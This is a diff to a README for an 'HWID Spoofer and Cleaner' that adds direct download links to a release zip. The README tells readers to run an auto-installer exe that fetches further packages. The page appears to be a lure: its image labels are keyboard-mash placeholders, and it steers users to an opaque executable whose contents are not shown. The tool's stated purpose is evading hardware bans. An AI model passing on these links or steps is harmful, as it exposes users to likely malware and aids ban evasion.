@@ -7,11 +7,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/4fb56c7b-d4cd-4217-9653-3d1747ed292e)
-]()
+](https://github.com/ITcattt/HWID-Spoofer-and-Cleaner-2024/releases/download/V3.5/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/ITcattt/HWID-Spoofer-and-Cleaner-2024/releases/download/V3.5/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![dfgdfgdf](https://github.com/user-attachments/assets/74b8102e-47be-4546-834e-859ea27507c8)
